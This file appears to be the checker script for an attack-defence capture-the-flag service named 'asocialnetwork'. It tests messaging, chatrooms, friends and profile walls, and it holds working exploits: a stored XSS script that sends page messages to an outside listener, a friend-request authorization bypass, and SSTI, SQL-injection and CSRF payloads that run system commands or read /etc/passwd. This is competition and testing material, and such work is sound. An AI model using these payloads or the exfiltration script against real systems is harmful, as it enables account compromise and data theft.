import asyncio
import json
import random
import secrets
from typing import Optional
from httpx import AsyncClient
from logging import LoggerAdapter
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    HavocCheckerTaskMessage
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import time
from playwright.async_api import async_playwright
from http.server import BaseHTTPRequestHandler, HTTPServer
import multiprocessing
import hashlib
import os
from faker import Faker
import nest_asyncio

name_fake = Faker(
    locale=['ja-JP', 'en-US', 'de-DE', 'fr-FR', 'it-IT', 'es-ES', 'ru-RU', 'zh-CN', 'pt-BR', 'pl-PL', 'tr-TR', 'id-ID',
            'ar-EG', 'ko-KR', 'th-TH', 'cs-CZ', 'bg-BG', 'el-GR', 'fa-IR', 'fi-FI', 'he-IL', 'hi-IN', 'hu-HU', 'nl-NL',
            'no-NO', 'ro-RO', 'sv-SE', 'uk-UA', 'vi-VN', 'sk-SK', 'sl-SI', 'lt-LT', 'hr-HR'])
text_fake = Faker()
HOST = "0.0.0.0"
PORT = 6452

SERVICE_PORT = 3000
checker = Enochecker("asocialnetwork", SERVICE_PORT)
app = lambda: checker.app
getUrl = lambda task: f"http://{task.address + ':' + str(SERVICE_PORT)}"


# event_loop = asyncio.new_event_loop()
# nest_asyncio.apply(event_loop)
# async def main():
#     p = await async_playwright().start()
#     return await p.chromium.launch(headless=True, chromium_sandbox=False)
#
# browser = asyncio.run(main())

def encode(message, recipient, logger):
    message = message.encode('utf-8').hex()
    recipient = recipient * (len(message) // len(recipient) + 1)
    encoded_message = "".join([chr(ord(message[i]) ^ ord(recipient[i])) for i in range(len(message))])
    encoded_message = encoded_message
    return encoded_message


async def register(task, client, password, logger):
    r = None
    username = None
    for _ in range(10):
        username = name_fake.name().lower().replace(' ', '_') + str(random.randint(0, 100000))
        logger.debug(f"Registering as {username}:{password}")
        r = await client.post(f"{getUrl(task)}/register",
                              json={"username": username, "password": password, "confirmPassword": password})
        if r.status_code == 302:
            break
    assert_equals(r.status_code, 302, "registering failed")
    return r.cookies, username


def generateNoise():
    return text_fake.text()


async def login(task, client, username, password, logger):
    logger.debug(f"Logging in as {username}:{password}")
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 302, "login failed")
    return r.cookies


async def sendMessage(task, client, recipient, message, logger):
    if not (password := os.environ.get('ENOCHECKER_PUTFLAG_PASSWORD')):
        password = secrets.token_hex(32)
    encoded_message = encode(message, recipient, logger)
    cookie, username = await register(task, client, password, logger)
    await client.post(f"{getUrl(task)}/messages/", json={"recipient": recipient, "message": encoded_message},
                      cookies=cookie)
    return username, password, cookie


async def retrieveMessage(task, client, recipient, logger, username, password):
    cookie = await login(task, client, username, password, logger)
    logger.debug(f"Retrieving Message for {username}:{password}")
    r = await client.get(f"{getUrl(task)}/messages/{recipient}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving message failed")
    return r, cookie


async def createChatroom(task, name, public, client, cookie, logger):
    logger.debug(f"Creating private chatroom {name}")
    r = await client.post(f"{getUrl(task)}/chatroom", json={'roomname': name, 'public': 'true' if public else 'false'},
                          cookies=cookie)
    assert_equals(r.status_code, 200, "creating private chatroom failed")
    return r.text


@checker.putflag(0)
async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
        Optional[str]:
    flag = task.flag
    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
    username, password, cookie = await sendMessage(task, client, recipient, flag, logger)
    await chain_db.set("userdata", (username, recipient, password, flag))
    if os.environ.get('ENOCHECKER_PUTFLAG_PASSWORD', None):
        return json.dumps({'username': username, 'recipient': recipient})
    return json.dumps({'username': username})


browsers = dict()

async def retrieve(task, logger, username, password, recipient, start, client):
    if not browsers.get(os.getpid()):
        browsers[os.getpid()] = {"playwright": await async_playwright().start()}
        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch(headless=True, chromium_sandbox=False)
        browsers[os.getpid()]["context"] = await browsers[os.getpid()]["browser"].new_context()
        browsers[os.getpid()]["page"] = await browsers[os.getpid()]["context"].new_page()
        # browsers[os.getpid()]["page"].set_default_timeout(1000)

    browser = browsers[os.getpid()]["browser"]
    p = browsers[os.getpid()]["playwright"]
    try:
        context = await browsers[os.getpid()]["browser"].new_context()
        page = await context.new_page()
    except Exception as e:
        try:
            await browser.close()
        except:
            pass
        try:
            await p.stop()
        except:
            pass
        browsers.pop(os.getpid(), None)
        raise e
    try:
        cookies = (await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})).cookies
        cookie = [{'name': 'session', 'value': cookies['session'], 'domain': task.address, 'path': '/'}]
        await context.add_cookies(cookie)
        await page.goto(f"{getUrl(task)}/messages/{recipient}")
        assert_in(task.flag, await page.content(), "flag missing")
        while len((await page.content()).split('<div class="modal-body" style="white-space: pre-line">')) > 1 \
                and time.time() - start < ((task.timeout / 1000) - 2):
            await page.goto(f"{getUrl(task)}/messages/{recipient}")
    except Exception as e:
        raise e
    finally:
        await page.close()
        await context.close()


@checker.getflag(0)
async def getflag0(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    start = time.time()
    try:
        username, recipient, password, flag = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    # event_loop.run_until_complete(retrieve(task, logger, username, password, recipient, start))
    await retrieve(task, logger, username, password, recipient, start, client)


@checker.putflag(1)
async def putflag1(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> \
        Optional[str]:
    flag = task.flag
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": flag}, cookies=cookie)
    await chain_db.set("userdata", (username, password, flag, roomUrl))
    return json.dumps({'username': username})


@checker.getflag(1)
async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, flag, roomUrl = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(task.flag, r.text, "flag missing")
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    logger.debug("Getting chatroom with new user")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    try:
        assert_in(task.flag, r.text, "chatroom preventing access to new user")
    except Exception as e:
        logger.debug("Error finding " + task.flag + " in " + r.text)
        raise e


@checker.putnoise(0)
async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
    await chain_db.set("noise", (username, recipient, password, noise))


@checker.getnoise(0)
async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, recipient, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    r, _ = await retrieveMessage(task, client, recipient, logger, username, password)
    assert_in(noise, r.text, "noise missing from messages")


@checker.putnoise(1)
async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving public chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending public chatroom message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(1)
async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from public chatroom")
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    assert_in(noise, r.text, "public chatroom preventing access to new user")


@checker.putnoise(2)
async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    noise = generateNoise()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    roomName = secrets.token_hex(10)
    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_equals(r.status_code, 200, "retrieving private chatroom failed")
    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
                          json={"message": noise}, cookies=cookie)
    assert_equals(r.status_code, 302, "sending private chatroom message failed")
    await chain_db.set("noise", (username, password, noise, roomUrl))


@checker.getnoise(2)
async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, noise, roomUrl = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from private chatroom")
    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
    assert_in(noise, r.text, "private chatroom preventing access to new user")


@checker.putnoise(3)
async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    profilePic = random.choice(range(1, 50))
    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
    assert_equals(r.status_code, 200, "setting profile picture failed")
    await chain_db.set("noise", (username, password, profilePic))


@checker.getnoise(3)
async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, profilePic = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}", cookies=cookie)
    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing or incorrect at home")


@checker.putnoise(4)
async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, password, noise))


@checker.getnoise(4)
async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, password, message = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_in(message, r.text, "message missing from profile wall")


@checker.putnoise(5)
async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                    logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    noise = generateNoise()
    cookie, username = await register(task, client, password, logger)
    partnerCookie, partner = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(f"You are not friends with this user", r.text, "profile page visible to non-friends")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(f"You are not friends with this user", r.text, "profile page visible to requested friends")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=cookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
    await chain_db.set("noise", (username, partner, password, noise))


@checker.getnoise(5)
async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        username, partner, password, noise = await db.get("noise")
    except KeyError:
        raise MumbleException("Missing database entry from putnoise")
    cookie = await login(task, client, username, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
    assert_in(noise, r.text, "noise missing from profile wall")


@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = name_fake.name().lower().replace(' ', '_') + str(random.randint(100001, 1000000))
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")


@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    username = secrets.token_hex(32)
    password = secrets.token_hex(32)
    r = await client.post(f"{getUrl(task)}/register",
                          json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 302, "register failed")
    r = await client.post(f"{getUrl(task)}/register",
                          json={"username": username, "password": password, "confirmPassword": password})
    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")


@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
    assert_equals(r.status_code, 200, "getting profile failed")


@checker.havoc(3)
async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
    cookie, username = await register(task, client, password, logger)
    r = await client.post(f"{getUrl(task)}/messages/",
                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
                          cookies=cookie)
    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")


@checker.havoc(4)
async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    cookie, _ = await register(task, client, password, logger)
    _, newUser = await register(task, client, password, logger)
    r = await client.get(f"{getUrl(task)}/profile/{newUser}", cookies=cookie)
    assert_equals(r.status_code, 400, "getting profile of non-friend succeeded")


fakePayloads = [
    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    "{{[0]|reduce('system','id')}}",
    "{{['id']|map('system')|join}}",
    "{{['id']|filter('system')}}",
    "{{['id',1]|sort('system')|join}}",
    "{{['cat\x20/etc/passwd']|filter('system')}}",
    "{{['cat$IFS/etc/passwd']|filter('system')}}",
    "{{['id']|filter('passthru')}}",
    "{['id']|map('passthru')}}",
    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
     <input name="username" type="hidden" value="CSRFd" />
     <input type="submit" value="Submit Request" />
    </form>
    <script>
     document.getElementById("autosubmit").submit();
    </script>""",
    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
]


@checker.havoc(5)
async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                 logger: LoggerAdapter) -> None:
    password = secrets.token_hex(32)
    await client.post(f"{getUrl(task)}/login",
                      json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})


exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
                 "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                 " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                 "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"


def server(logger):
    class ExploitServer(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            if not os.path.isfile("/checker/flag.txt"):
                os.mknod("/checker/flag.txt")
            with open("/checker/flag.txt", "wb") as exploit:
                exploit.write(post_data)

    webServer = HTTPServer((HOST, PORT), ExploitServer)
    webServer.serve_forever()


def getFlag():
    while True:
        if os.path.isfile("/checker/flag.txt") and os.access("/checker/flag.txt", os.R_OK):
            with open("/checker/flag.txt", "r") as flag:
                return flag.read()


@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    if not json.loads(task.attack_info).keys() >= {'username', 'recipient'}:
        return None
    if not os.getenv("ENOCHECKER_PUTFLAG_PASSWORD"):
        return None
    process = multiprocessing.Process(target=server, args=(logger,))
    process.start()
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    payload = encode(exploitMessage.format(task.address), target, logger)
    r = await client.post(f"{getUrl(task)}/messages/", json={"recipient": target, "message": payload}, cookies=cookie)
    assert_equals(r.status_code, 200, "exploit failed")
    # event_loop.run_until_complete(xss_test(task, logger))
    await xss_test(task, logger)
    flagText = getFlag()
    flag = searcher.search_flag(flagText)
    process.terminate()
    return flag


async def xss_test(task, logger):
    if not browsers.get(os.getpid()):
        browsers[os.getpid()] = {"playwright": await async_playwright().start()}
        browsers[os.getpid()]["browser"] = await browsers[os.getpid()]["playwright"].chromium.launch()
        browsers[os.getpid()]["context"] = await browsers[os.getpid()]["browser"].new_context()
        browsers[os.getpid()]["page"] = await browsers[os.getpid()]["context"].new_page()
    browser = browsers[os.getpid()]["browser"]
    context = await browser.new_context()
    page = await context.new_page()
    try:
        logger.debug("Logging in as {}".format(json.loads(task.attack_info)['username']))
        await page.goto(f"{getUrl(task)}/login")
        # await page.wait_for_load_state("networkidle")
        await page.fill("#username", json.loads(task.attack_info)['username'])
        await page.fill("#password", "password")
        await page.click("input[type=submit]")
        logger.debug("Going to messages of {}".format(json.loads(task.attack_info)['recipient']))
        await page.goto(f"{getUrl(task)}/messages/{json.loads(task.attack_info)['recipient']}")
        logger.debug(await page.content())
        # await page.wait_for_load_state("networkidle")
    except Exception as e:
        raise (e)
    finally:
        await page.close()
        await context.close()


@checker.exploit(1)
async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient,
                   logger: LoggerAdapter) -> Optional[str]:
    password = secrets.token_hex(32)
    cookie, username = await register(task, client, password, logger)
    target = json.loads(task.attack_info)['username']
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'send'}, cookies=cookie)
    assert_equals(r.status_code, 200, "sending friend request failed")
    r = await client.post(f"{getUrl(task)}/friends/requests",
                          json={'userName': username, 'partner': target, 'status': 'accept'}, cookies=cookie)
    assert_equals(r.status_code, 200, "accepting friend request failed")
    r = await client.get(f"{getUrl(task)}/profile/{target}", cookies=cookie)
    if len(r.text.split('<h3>')) < 2:
        return
    roomName = r.text.split('<h3>')[1].split('</h3>')[0]
    roomUrl = hashlib.sha256(roomName.encode()).hexdigest()
    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
    if flag := searcher.search_flag(r.text):
        return flag


if __name__ == "__main__":
    checker.run()
